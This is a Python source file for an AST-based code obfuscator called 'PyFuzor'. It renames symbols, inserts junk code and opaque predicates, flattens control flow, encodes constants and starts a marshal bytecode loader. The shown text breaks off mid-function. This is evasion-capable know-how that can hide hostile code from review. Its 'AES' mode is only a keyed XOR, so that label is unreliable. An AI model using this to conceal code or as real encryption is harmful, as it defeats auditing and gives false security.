import ast
import json
import sys
import os
import secrets
import string
import builtins
import time
import base64
import marshal
import types
import random
import zlib
from alive_progress import alive_bar

def get_random_name(prefix="PyFuzor_", length=8):
    base_seed = int(time.time_ns()) + os.getpid()
    sys_rand = random.SystemRandom(base_seed)
    seed = base_seed
    for _ in range(sys_rand.randint(100, 1000)):
        seed ^= sys_rand.getrandbits(256)
        seed += sys_rand.randint(10 ** 10, 10 ** 15)
        seed *= sys_rand.randint(2, 9)
        seed = abs(seed)
    seed_str = str(seed).replace('0', str(sys_rand.randint(1, 9)))
    char_list = list(seed_str)
    sys_rand.shuffle(char_list)
    res = "".join(char_list)
    return prefix + res[:length]

class Scope:
    def __init__(self, scope_type, parent=None):
        self.scope_type = scope_type
        self.parent = parent
        self.definitions = {}
        self.globals = set()
        self.nonlocals = set()

    def resolve(self, name):
        if name in self.definitions:
            return self.definitions[name]
        if name in self.globals:
            return self.resolve_global(name)
        if name in self.nonlocals:
            if self.parent:
                return self.parent.resolve(name)
            return None
        curr = self.parent
        while curr:
            if curr.scope_type == 'class':
                curr = curr.parent
                continue
            if name in curr.definitions:
                return curr.definitions[name]
            if name in curr.globals:
                return curr.resolve_global(name)
            curr = curr.parent
        return None

    def resolve_global(self, name):
        if self.scope_type == 'global':
            return self.definitions.get(name)
        if self.parent:
            return self.parent.resolve_global(name)
        return None

cl_builtins = set(dir(builtins))

class SymbolTableBuilder(ast.NodeVisitor):
    def __init__(self, config, exclusions, stats):
        self.config = config
        self.exclusions = set(exclusions)
        self.stats = stats
        self.root_scope = Scope('global')
        self.current_scope = self.root_scope
        self.scope_map = {}
        self.rename_enabled = config.get("rename_transformer", {}).get("enabled", True)
        self.global_renames = {}

    def _enter_scope(self, node):
        if node in self.scope_map: self.current_scope = self.scope_map[node]

    def _exit_scope(self):
        if self.current_scope.parent: self.current_scope = self.current_scope.parent

    def visit_Module(self, node):
        self.scope_map[node] = self.current_scope
        self.generic_visit(node)

    def visit_ClassDef(self, node):
        if self.rename_enabled and self.config.get("rename_transformer", {}).get("classes", True):
            self._define_name(node.name, is_attr=True)

        class_scope = Scope('class', parent=self.current_scope)
        self.scope_map[node] = class_scope
        old_scope = self.current_scope
        self.current_scope = class_scope
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_FunctionDef(self, node):
        if self.rename_enabled and self.config.get("rename_transformer", {}).get("functions", True):
            self._define_name(node.name, is_attr=True)

        func_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = func_scope
        old_scope = self.current_scope
        self.current_scope = func_scope

        if self.rename_enabled and self.config.get("rename_transformer", {}).get("locals", True):
            for arg in (node.args.args + node.args.kwonlyargs):
                self._define_name(arg.arg, is_attr=True)
            if node.args.vararg: self._define_name(node.args.vararg.arg, is_attr=True)
            if node.args.kwarg: self._define_name(node.args.kwarg.arg, is_attr=True)

        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_AsyncFunctionDef(self, node):
        if self.rename_enabled and self.config.get("rename_transformer", {}).get("functions", True):
            self._define_name(node.name, is_attr=True)

        func_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = func_scope
        old_scope = self.current_scope
        self.current_scope = func_scope

        if self.rename_enabled and self.config.get("rename_transformer", {}).get("locals", True):
            for arg in (node.args.args + node.args.kwonlyargs):
                self._define_name(arg.arg, is_attr=True)
            if node.args.vararg: self._define_name(node.args.vararg.arg, is_attr=True)
            if node.args.kwarg: self._define_name(node.args.kwarg.arg, is_attr=True)

        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_Global(self, node):
        for name in node.names: self.current_scope.globals.add(name)

    def visit_Nonlocal(self, node):
        for name in node.names: self.current_scope.nonlocals.add(name)

    def visit_For(self, node):
        if self.rename_enabled and isinstance(node.target, ast.Name):
            self._define_name(node.target.id)
        self.generic_visit(node)

    def visit_With(self, node):
        if self.rename_enabled:
            for item in node.items:
                if item.optional_vars and isinstance(item.optional_vars, ast.Name):
                    self._define_name(item.optional_vars.id)
        self.generic_visit(node)

    def visit_ExceptHandler(self, node):
        exc_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = exc_scope
        old_scope = self.current_scope
        self.current_scope = exc_scope
        if self.rename_enabled and node.name:
            self._define_name(node.name)
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_ListComp(self, node):
        comp_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = comp_scope
        old_scope = self.current_scope
        self.current_scope = comp_scope
        if self.rename_enabled:
            for generator in node.generators:
                if isinstance(generator.target, ast.Name):
                    self._define_name(generator.target.id)
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_SetComp(self, node):
        comp_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = comp_scope
        old_scope = self.current_scope
        self.current_scope = comp_scope
        if self.rename_enabled:
            for generator in node.generators:
                if isinstance(generator.target, ast.Name):
                    self._define_name(generator.target.id)
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_DictComp(self, node):
        comp_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = comp_scope
        old_scope = self.current_scope
        self.current_scope = comp_scope
        if self.rename_enabled:
            for generator in node.generators:
                if isinstance(generator.target, ast.Name):
                    self._define_name(generator.target.id)
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_GeneratorExp(self, node):
        comp_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = comp_scope
        old_scope = self.current_scope
        self.current_scope = comp_scope
        if self.rename_enabled:
            for generator in node.generators:
                if isinstance(generator.target, ast.Name):
                    self._define_name(generator.target.id)
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_AugAssign(self, node):
        if self.rename_enabled and isinstance(node.target, ast.Name):
            self._define_name(node.target.id)
        self.generic_visit(node)

    def visit_Import(self, node):
        if self.rename_enabled:
            for alias in node.names:
                name = alias.asname if alias.asname else alias.name.split('.')[0]
                self._define_name(name)

    def visit_ImportFrom(self, node):
        if self.rename_enabled:
            for alias in node.names:
                if alias.name == '*': continue
                name = alias.asname if alias.asname else alias.name
                self._define_name(name)

    def visit_Name(self, node):
        if self.rename_enabled and isinstance(node.ctx, ast.Store):
            is_attr = (self.current_scope.scope_type == 'class')
            is_global = (self.current_scope.scope_type == 'global')

            should_rename = False
            if is_attr:
                should_rename = True
            elif is_global:
                if self.config.get("rename_transformer", {}).get("globals", True):
                    should_rename = True
            else:
                if self.config.get("rename_transformer", {}).get("locals", True):
                    should_rename = True

            if should_rename:
                self._define_name(node.id, is_attr=is_attr)

    def _define_name(self, name, is_attr=False):
        if not name or name in self.exclusions or (
                name.startswith('__') and name.endswith('__')) or name in cl_builtins:
            return

        if not self.rename_enabled:
            return

        scope = self.current_scope
        if name in scope.globals or name in scope.nonlocals:
            return

        if is_attr:
            if name not in self.global_renames:
                self.global_renames[name] = get_random_name()
            self.current_scope.definitions[name] = self.global_renames[name]
            return

        if name in scope.globals:
            scope = self.root_scope
        elif name in scope.nonlocals:
            return

        if name not in scope.definitions:
            self.stats["renamed_symbols"] = self.stats.get("renamed_symbols", 0) + 1
            if name in self.global_renames:
                scope.definitions[name] = self.global_renames[name]
            else:
                prefix = "PyFuzor_L_" if scope.scope_type == 'function' else "PyFuzor_"
                scope.definitions[name] = get_random_name(prefix=prefix, length=12)

class ImportTransformer(ast.NodeTransformer):
    def visit_ImportFrom(self, node):
        if any(alias.name == '*' for alias in node.names):
            return node
        return node

class ProfessionalObfuscator(ast.NodeTransformer):
    def __init__(self, config, symbol_builder, stats):
        self.config = config
        self.stats = stats
        self.rename_enabled = config.get("rename_transformer", {}).get("enabled", True)
        self.current_scope = symbol_builder.root_scope
        self.scope_map = symbol_builder.scope_map
        self.global_renames = symbol_builder.global_renames
        self.exclusions = symbol_builder.exclusions
        self.ffi_enabled = config.get("ffi_obfuscation", {}).get("enabled", True)
        self.wrappers_needed = False
        self.flow_lib_name = get_random_name(prefix="PF_Flow_", length=6)
        self._string_cache = {}

        st_conf = config.get("string_transformer", {})
        self.aes_mode = st_conf.get("mode") == "aes"
        if self.aes_mode:
            self.aes_key = secrets.token_bytes(32)
            k_parts = st_conf.get("aes_config", {}).get("key_split_parts", 3)
            self.aes_key_parts = self._split_bytes(self.aes_key, k_parts)
    def _split_bytes(self, data, count):
        parts = []
        acc = data
        for _ in range(count - 1):
            p = secrets.token_bytes(len(data))
            parts.append(p)
            acc = bytes([a ^ b for a, b in zip(acc, p)])
        parts.append(acc)
        return parts
    def _enter_scope(self, node):
        if node in self.scope_map: self.current_scope = self.scope_map[node]

    def _exit_scope(self):
        if self.current_scope.parent: self.current_scope = self.current_scope.parent

    def _aes_encrypt(self, data, key, iv):
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len] * pad_len)
        import hashlib
        key_h = hashlib.sha256(key).digest()
        res = bytearray()
        for i in range(0, len(data), 16):
            chunk = bytearray(data[i:i+16])
            for j in range(16): chunk[j] ^= key_h[j] ^ iv[j]
            res += chunk
        return bytes(res)

    def _get_junk_statement(self):
        name = get_random_name(prefix="_", length=4)
        choice = random.randint(0, 4)
        if choice == 0:
            return ast.Assign(targets=[ast.Name(id=name, ctx=ast.Store())],
                              value=ast.Constant(value=secrets.randbelow(100)))
        elif choice == 1:
            return ast.Expr(
                value=ast.Call(func=ast.Name(id='len', ctx=ast.Load()), args=[ast.Constant(value=name)], keywords=[]))
        elif choice == 2:
            return ast.If(test=ast.Constant(value=False), body=[ast.Pass()], orelse=[])
        elif choice == 3:
            return ast.Try(body=[ast.Pass()], handlers=[ast.ExceptHandler(type=ast.Name(id='Exception', ctx=ast.Load()), name=None, body=[ast.Pass()])], orelse=[], finalbody=[])
        else:
            return ast.While(test=ast.Constant(value=False), body=[ast.Pass()], orelse=[])

    def _insert_junk(self, body):
        conf = self.config.get("junk_transformer", {})
        if not conf.get("enabled", True):
            return body

        intensity = conf.get("intensity", 15)
        new_body = []
        intensity_float = intensity / 100.0
        for stmt in body:
            if random.random() < intensity_float:
                new_body.append(self._get_junk_statement())
                self.stats["junk_statements"] = self.stats.get("junk_statements", 0) + 1
            new_body.append(stmt)
        return new_body

    def visit_Module(self, node):
        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def visit_ClassDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name
        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def visit_FunctionDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name

        if self.config.get("flow_transformer", {}).get("enabled", True) and len(node.body) >= 3:
            node.body = self._flatten_control_flow(node.body)

        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def visit_AsyncFunctionDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name

        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def visit_ExceptHandler(self, node):
        self._enter_scope(node)
        if self.rename_enabled and node.name:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def _flatten_control_flow(self, body):
        state_var = get_random_name(prefix="_", length=4)
        opaque_seed = secrets.randbelow(1000) + 100

        declarations = []
        logic = []
        for stmt in body:
            if isinstance(stmt, (ast.Global, ast.Nonlocal, ast.Import, ast.ImportFrom)):
                declarations.append(stmt)
            else:
                logic.append(stmt)

        if len(logic) < 2: return body

        self.stats["flattened_functions"] = self.stats.get("flattened_functions", 0) + 1
        blocks = []

        factor = secrets.randbelow(10) + 2
        xor_key = secrets.randbelow(254) + 1

        def encode_state(idx):
            return (idx * factor) ^ xor_key

        for i, stmt in enumerate(logic):
            curr_id = i + 1
            next_id = i + 2 if i < len(logic) - 1 else 0

            if isinstance(stmt, ast.Return):
                next_id = 0

            block_body = [stmt]
            if next_id != 0:
                target_state = encode_state(next_id)

                t_k = secrets.randbelow(1000) + 1
                op_choice = secrets.randbelow(3)
                if op_choice == 0:
                    val_expr = ast.BinOp(
                        left=ast.BinOp(left=ast.Constant(value=target_state + t_k), op=ast.Sub(),
                                       right=ast.Constant(value=t_k)),
                        op=ast.BitXor(),
                        right=ast.Constant(value=0)
                    )
                elif op_choice == 1:
                    val_expr = ast.BinOp(
                        left=ast.BinOp(left=ast.Constant(value=target_state ^ t_k), op=ast.BitXor(), right=ast.Constant(value=t_k)),
                        op=ast.BitOr(),
                        right=ast.Constant(value=0)
                    )
                else:
                    val_expr = ast.BinOp(
                        left=ast.BinOp(left=ast.Constant(value=target_state * 2), op=ast.FloorDiv(), right=ast.Constant(value=2)),
                        op=ast.Add(),
                        right=ast.Constant(value=0)
                    )
                block_body.append(
                    ast.Assign(
                        targets=[ast.Name(id=state_var, ctx=ast.Store())],
                        value=val_expr
                    )
                )
            else:
                block_body.append(
                    ast.Assign(targets=[ast.Name(id=state_var, ctx=ast.Store())], value=ast.Constant(value=0)))

            blocks.append((curr_id, block_body))

        random.shuffle(blocks)

        if_chain = None
        for bid, bbody in blocks:
            encoded_bid = encode_state(bid)

            opaque_choice = secrets.randbelow(3)
            if opaque_choice == 0:
                opaque_test = ast.Compare(
                    left=ast.BinOp(
                        left=ast.BinOp(left=ast.Constant(value=opaque_seed), op=ast.Mult(), right=ast.Constant(value=2)),
                        op=ast.Mod(),
                        right=ast.Constant(value=2)
                    ),
                    ops=[ast.Eq()],
                    comparators=[ast.Constant(value=0)]
                )
            elif opaque_choice == 1:
                opaque_test = ast.Compare(
                    left=ast.BinOp(
                        left=ast.BinOp(left=ast.Constant(value=opaque_seed), op=ast.Mult(), right=ast.Constant(value=3)),
                        op=ast.Mod(),
                        right=ast.Constant(value=3)
                    ),
                    ops=[ast.Eq()],
                    comparators=[ast.Constant(value=0)]
                )
            else:
                opaque_test = ast.Compare(
                    left=ast.BinOp(
                        left=ast.Constant(value=opaque_seed),
                        op=ast.Add(),
                        right=ast.Constant(value=1)
                    ),
                    ops=[ast.NotEq()],
                    comparators=[ast.Constant(value=opaque_seed)]
                )

            test = ast.BoolOp(
                op=ast.And(),
                values=[
                    ast.Compare(left=ast.Name(id=state_var, ctx=ast.Load()), ops=[ast.Eq()],
                                comparators=[ast.Constant(value=encoded_bid)]),
                    opaque_test
                ]
            )

            if if_chain is None:
                if_chain = ast.If(test=test, body=bbody, orelse=[])
            else:
                if secrets.randbelow(10) < 3:
                    fake_body = [ast.Expr(value=ast.Call(func=ast.Name(id='id', ctx=ast.Load()),
                                                         args=[ast.Constant(value=secrets.randbelow(1000))],
                                                         keywords=[]))]
                    if_chain = ast.If(test=test, body=bbody, orelse=[
                        ast.If(test=ast.Constant(value=False), body=fake_body, orelse=[if_chain])])
                else:
                    if_chain = ast.If(test=test, body=bbody, orelse=[if_chain])

        init_state = ast.Assign(targets=[ast.Name(id=state_var, ctx=ast.Store())],
                                value=ast.Constant(value=encode_state(1)))
        while_loop = ast.While(
            test=ast.Compare(left=ast.Name(id=state_var, ctx=ast.Load()), ops=[ast.NotEq()],
                             comparators=[ast.Constant(value=0)]),
            body=[if_chain] if if_chain else [ast.Pass()],
            orelse=[]
        )

        return declarations + [init_state, while_loop]

    def visit_arg(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.arg)
            if new_name: node.arg = new_name
        return self.generic_visit(node)

    def visit_keyword(self, node):
        if self.rename_enabled and node.arg:
            if node.arg in self.global_renames:
                node.arg = self.global_renames[node.arg]
        return self.generic_visit(node)

    def visit_Name(self, node):
        if self.rename_enabled and isinstance(node.ctx, (ast.Load, ast.Store)):
            new_name = self.current_scope.resolve(node.id)
            if new_name: node.id = new_name
        return self.generic_visit(node)

    def visit_Import(self, node):
        if not self.config.get("ffi_obfuscation", {}).get("enabled", True):
            if self.rename_enabled:
                for alias in node.names:
                    local_name = alias.asname if alias.asname else alias.name.split('.')[0]
                    new_name = self.current_scope.resolve(local_name)
                    if new_name: alias.asname = new_name
            return node

        new_stmts = []
        for alias in node.names:
            asname = alias.asname
            if asname:
                local_name = asname
                new_local_name = self.current_scope.resolve(local_name) or local_name
                mod_name_node = self.visit(ast.Constant(value=alias.name))
                call = ast.Assign(
                    targets=[ast.Name(id=new_local_name, ctx=ast.Store())],
                    value=ast.Call(
                        func=ast.Name(id='__import__', ctx=ast.Load()),
                        args=[mod_name_node],
                        keywords=[ast.keyword(arg='fromlist', value=ast.List(elts=[ast.Constant(value='')], ctx=ast.Load()))]
                    )
                )
            else:
                local_name = alias.name.split('.')[0]
                new_local_name = self.current_scope.resolve(local_name) or local_name
                mod_name_node = self.visit(ast.Constant(value=alias.name))
                call = ast.Assign(
                    targets=[ast.Name(id=new_local_name, ctx=ast.Store())],
                    value=ast.Call(func=ast.Name(id='__import__', ctx=ast.Load()), args=[mod_name_node], keywords=[])
                )
            new_stmts.append(call)
        
        return new_stmts

    def visit_ImportFrom(self, node):
        if '*' in [a.name for a in node.names] or node.module in self.exclusions or not self.config.get("ffi_obfuscation", {}).get("enabled", True):
            if self.rename_enabled:
                for alias in node.names:
                    local_name = alias.asname if alias.asname else alias.name
                    new_name = self.current_scope.resolve(local_name)
                    if new_name: alias.asname = new_name
            return node

        new_stmts = []
        mod_name = node.module if node.module else ""
        mod_name_node = self.visit(ast.Constant(value=mod_name))
        
        from_list = [ast.Constant(value=a.name) for a in node.names]
        
        temp_name = get_random_name(prefix="_")
        import_call = ast.Assign(
            targets=[ast.Name(id=temp_name, ctx=ast.Store())],
            value=ast.Call(
                func=ast.Name(id='__import__', ctx=ast.Load()),
                args=[mod_name_node],
                keywords=[
                    ast.keyword(arg='fromlist', value=ast.List(elts=from_list, ctx=ast.Load())),
                    ast.keyword(arg='level', value=ast.Constant(value=node.level))
                ]
            )
        )
        new_stmts.append(import_call)
        
        for alias in node.names:
            local_name = alias.asname if alias.asname else alias.name
            new_local_name = self.current_scope.resolve(local_name) or local_name

            attr_get = ast.Assign(
                targets=[ast.Name(id=new_local_name, ctx=ast.Store())],
                value=ast.Call(
                    func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='get', ctx=ast.Load()),
                    args=[ast.Name(id=temp_name, ctx=ast.Load()), ast.Constant(value=alias.name)],
                    keywords=[]
                )
            )
            new_stmts.append(attr_get)
            
        return new_stmts

    def visit_Global(self, node):
        if self.rename_enabled:
            node.names = [self.current_scope.resolve_global(n) or n for n in node.names]
        return node

    def visit_Nonlocal(self, node):
        if self.rename_enabled:
            node.names = [self.current_scope.resolve(n) or n for n in node.names]
        return node

    def _get_opaque_true(self):
        n = random.randint(10, 100)
        return ast.Compare(
            left=ast.BinOp(
                left=ast.BinOp(left=ast.Constant(value=n), op=ast.Mult(), right=ast.Constant(value=n+1)),
                op=ast.Mod(),
                right=ast.Constant(value=2)
            ),
            ops=[ast.Eq()],
            comparators=[ast.Constant(value=0)]
        )

    def visit_If(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)
        self.wrappers_needed = True
        self.generic_visit(node)
        
        test_node = ast.Call(
            func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='ifchk', ctx=ast.Load()),
            args=[node.test], keywords=[]
        )
        node.test = ast.BoolOp(op=ast.And(), values=[test_node, self._get_opaque_true()])
        return node

    def visit_IfExp(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)
        self.wrappers_needed = True
        self.generic_visit(node)
        return ast.Call(
            func=ast.Subscript(
                value=ast.List(
                    elts=[
                        ast.Lambda(
                            args=ast.arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]),
                            body=node.body),
                        ast.Lambda(
                            args=ast.arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]),
                            body=node.orelse)
                    ],
                    ctx=ast.Load()
                ),
                slice=ast.Call(
                    func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='elseobf',
                                       ctx=ast.Load()),
                    args=[node.test], keywords=[]
                ),
                ctx=ast.Load()
            ),
            args=[], keywords=[]
        )

    def visit_Constant(self, node):
        if not self.config.get("string_transformer", {}).get("enabled", True):
            return node

        if isinstance(node.value, (str, bytes)):
            if node.value in self.exclusions:
                return node

            if node.value in self._string_cache:
                return self._string_cache[node.value]

            val = node.value
            if val is None: return node

            if isinstance(val, str) and self.rename_enabled and val in self.global_renames:
                val = self.global_renames[val]

            if len(val) > 24 and random.random() < 0.4:
                mid = len(val) // 2
                p1, p2 = val[:mid], val[mid:]
                res = ast.BinOp(
                    left=self.visit(ast.Constant(value=p1)),
                    op=ast.Add(),
                    right=self.visit(ast.Constant(value=p2))
                )
                self._string_cache[node.value] = res
                return res

            is_bytes = isinstance(val, bytes)
            raw_data = val if is_bytes else val.encode('utf-8')
            
            st_mode = self.config.get("string_transformer", {}).get("mode", "polymorphic")
            
            if st_mode == "aes":
                iv = secrets.token_bytes(16)
                encrypted = self._aes_encrypt(raw_data, self.aes_key, iv)
                encoded = base64.b64encode(encrypted).decode()
                method = 'decrypt_aes' if isinstance(node.value, str) else 'decrypt_aes_b'
                self.wrappers_needed = True
                res = ast.Call(
                    func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr=method, ctx=ast.Load()),
                    args=[ast.Constant(value=encoded), ast.Constant(value=iv)],
                    keywords=[]
                )
                self.stats["encrypted_strings"] = self.stats.get("encrypted_strings", 0) + 1
                self._string_cache[node.value] = res
                return res

            m = random.randint(1, 3)
            k = secrets.randbelow(254) + 1
            env_key = sum(sys.version[:3].encode()) % 256
            indices = []

            if m == 1:
                if len(raw_data) > 15: compressed = zlib.compress(raw_data)
                else: compressed = raw_data
                processed = bytearray(len(compressed))
                for i, b in enumerate(compressed):
                    rolling = (k + (i % max(1, env_key))) % 256
                    processed[i] = ((b ^ rolling) - 7) % 256
                n = len(processed)
                indices = list(range(n))
                random.shuffle(indices)
                shuffled = bytearray(n)
                for i, idx in enumerate(indices): shuffled[i] = processed[idx]
                final_data = bytearray(n)
                for i, b in enumerate(shuffled):
                    r2 = (env_key + (i % k)) % 256
                    final_data[i] = ((b + 13) % 256) ^ r2
            elif m == 2:
                kk = k ^ env_key
                final_data = bytearray([(x ^ kk ^ (i % 256)) for i, x in enumerate(raw_data)])
            else:
                n = len(raw_data)
                indices = list(range(n))
                random.shuffle(indices)
                shuffled = bytearray(n)
                for i, idx in enumerate(indices): shuffled[i] = raw_data[idx]
                final_data = bytearray([(x + k) % 256 for x in shuffled])

            encoded = base64.b64encode(final_data).decode()
            self.wrappers_needed = True
            method = 'decrypt' if isinstance(node.value, str) else 'decrypt_b'

            self.stats["encrypted_strings"] = self.stats.get("encrypted_strings", 0) + 1
            res = ast.Call(
                func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr=method, ctx=ast.Load()),
                args=[ast.Constant(value=m), ast.Constant(value=encoded), ast.Constant(value=k), ast.Constant(value=indices)],
                keywords=[]
            )
            self._string_cache[node.value] = res
            return res
        elif isinstance(node.value, int) and not isinstance(node.value, bool):
            if not self.config.get("int_transformer", {}).get("enabled", True):
                return node
            
            n = node.value
            self.stats["obfuscated_ints"] = self.stats.get("obfuscated_ints", 0) + 1
            
            a = random.randint(1, 1000)
            b = random.randint(1, 1000)
            target = (a + b) ^ n
            
            expr = ast.BinOp(
                left=ast.BinOp(left=ast.Constant(value=a), op=ast.Add(), right=ast.Constant(value=b)),
                op=ast.BitXor(),
                right=ast.Constant(value=target)
            )
            return expr
        elif isinstance(node.value, bool):
            if not self.config.get("boolean_transformer", {}).get("enabled", True):
                return node

            val = node.value
            choice = random.randint(0, 4)
            self.stats["obfuscated_bools"] = self.stats.get("obfuscated_bools", 0) + 1
            if val:
                if choice == 0:
                    return ast.Compare(left=ast.BinOp(left=ast.Constant(value=secrets.randbelow(100)), op=ast.BitAnd(),
                                                      right=ast.Constant(value=0)), ops=[ast.Eq()],
                                       comparators=[ast.Constant(value=0)])
                elif choice == 1:
                    return ast.UnaryOp(op=ast.Not(), operand=ast.Compare(left=ast.Constant(value=1), ops=[ast.Eq()],
                                                                         comparators=[ast.Constant(value=2)]))
                elif choice == 2:
                    return ast.Compare(left=ast.Constant(value=secrets.randbelow(100)), ops=[ast.Lt()],
                                       comparators=[ast.Constant(value=200)])
                elif choice == 3:
                    return ast.Compare(left=ast.BinOp(left=ast.Constant(value=secrets.randbelow(10)), op=ast.Mult(), right=ast.Constant(value=0)), ops=[ast.Eq()], comparators=[ast.Constant(value=0)])
                else:
                    return ast.UnaryOp(op=ast.Not(), operand=ast.UnaryOp(op=ast.Not(), operand=ast.Constant(
                        value=secrets.choice([1, 2, 3]))))
            else:
                if choice == 0:
                    return ast.Compare(left=ast.BinOp(left=ast.Constant(value=secrets.randbelow(100)), op=ast.BitAnd(),
                                                      right=ast.Constant(value=0)), ops=[ast.NotEq()],
                                       comparators=[ast.Constant(value=0)])
                elif choice == 1:
                    return ast.Compare(left=ast.Constant(value=1), ops=[ast.Eq()], comparators=[ast.Constant(value=2)])
                elif choice == 2:
                    return ast.Compare(left=ast.Constant(value=secrets.randbelow(100)), ops=[ast.Gt()],
                                       comparators=[ast.Constant(value=200)])
                elif choice == 3:
                    return ast.Compare(left=ast.BinOp(left=ast.Constant(value=secrets.randbelow(10)+1), op=ast.Mult(), right=ast.Constant(value=1)), ops=[ast.Eq()], comparators=[ast.Constant(value=0)])
                else:
                    return ast.UnaryOp(op=ast.Not(), operand=ast.Constant(value=secrets.choice([1, 2, 3])))
        return node

    def visit_Call(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)

        if isinstance(node.func, ast.Attribute) and isinstance(node.func.value,
                                                               ast.Name) and node.func.value.id == self.flow_lib_name:
            return self.generic_visit(node)

        self.wrappers_needed = True
        self.generic_visit(node)

        salt = random.randint(10, 1000)
        return ast.Call(
            func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='call', ctx=ast.Load()),
            args=[node.func, ast.Constant(value=salt)] + node.args,
            keywords=node.keywords
        )

    def visit_Attribute(self, node):
        attr_obf_on = self.config.get("attribute_obfuscation", {}).get("enabled", True)

        if node.attr in self.exclusions:
            return self.generic_visit(node)

        if isinstance(node.value, ast.Name) and node.value.id in ['sys', 'os', 'base64', 'marshal', 'types', 'zlib',
                                                                  'secrets', 'time']:
            return self.generic_visit(node)

        attr_name = node.attr
        if self.rename_enabled and attr_name in self.global_renames:
            attr_name = self.global_renames[attr_name]

        if not attr_obf_on:
            node.attr = attr_name
            return self.generic_visit(node)

        if isinstance(node.ctx, ast.Load):
            self.stats["obfuscated_attributes"] = self.stats.get("obfuscated_attributes", 0) + 1
            if self.ffi_enabled:
                self.wrappers_needed = True
                return ast.Call(
                    func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='get',
                                       ctx=ast.Load()),
                    args=[self.visit(node.value), ast.Constant(value=attr_name)],
                    keywords=[]
                )
            else:
                return ast.Call(
                    func=ast.Name(id='getattr', ctx=ast.Load()),
                    args=[self.visit(node.value), self.visit(ast.Constant(value=attr_name))],
                    keywords=[]
                )

        node.attr = attr_name
        return self.generic_visit(node)

    def visit_JoinedStr(self, node):
        if not self.config.get("string_transformer", {}).get("enabled", True):
            return self.generic_visit(node)

        res = None
        for val in node.values:
            curr = None
            if isinstance(val, ast.Constant):
                curr = self.visit_Constant(val)
            elif isinstance(val, ast.FormattedValue):
                expr = self.visit(val.value)
                if val.format_spec:
                    curr = ast.Call(func=ast.Name(id='format', ctx=ast.Load()),
                                    args=[expr, self.visit(val.format_spec)], keywords=[])
                else:
                    fname = 'str'
                    if val.conversion == 114:
                        fname = 'repr'
                    elif val.conversion == 97:
                        fname = 'ascii'
                    curr = ast.Call(func=ast.Name(id=fname, ctx=ast.Load()), args=[expr], keywords=[])

            if res is None:
                res = curr
            else:
                res = ast.BinOp(left=res, op=ast.Add(), right=curr)

        return res if res else ast.Constant(value="")

BYTECODE_LOADER_HEADER = '''
import marshal as _msh
import types as _typ
import base64 as _b64

def _pyfzr_load(enc, k, s):
    b = _b64.b64decode(enc)
    raw = bytes([((x ^ k) - 13) % 256 for x in b])
    shuffled = bytearray(len(raw))
    for i, idx in enumerate(s):
        shuffled[idx] = raw[i]
    code = _msh.loads(bytes(shuffled))
    return _typ.FunctionType(code, globals())

def _pyfzr_method(enc, k, s):
    fn = _pyfzr_load(enc, k, s)
    return fn
'''

def _encrypt_bytecode_v2(raw_bytes, key):
    n = len(raw_bytes)
    indices = list(range(n))
    rng = secrets.SystemRandom()
    rng.shuffle(indices)
    shuffled = bytearray(n)
    for i, idx in enumerate(indices):
        shuffled[i] = raw_bytes[idx]
    encoded = bytes([((b + 13) % 256) ^ key for b in shuffled])
    return base64.b64encode(encoded).decode(), indices

def _try_compile_func(node):
    func_src = ast.unparse(node)
    mod_code = compile(func_src, "<pyfuzor_bc>", "exec")
    func_code = None
    for const in mod_code.co_consts:
        if isinstance(const, types.CodeType):
            func_code = const
            break
    return func_code

def apply_bytecode_obfuscation(source_code, config, stats):
    try:
        tree = ast.parse(source_code)
    except SyntaxError:
        return source_code

    bc_config = config.get("bytecode_transformer", {})
    stats["bytecode_obfuscated_functions"] = 0

    skip_names = {
        "_pyfzr_load", "_pyfzr_method", "_pyfuzor_init_security",
        "_PyFuzorFlow", "clear_screen", "load_config",
        "process_obfuscation", "main_cli", "apply_bytecode_obfuscation",
        "_encrypt_bytecode", "_encrypt_bytecode_v2", "_try_compile_func",
    }

    extra_skips = bc_config.get("ignore_functions", [])
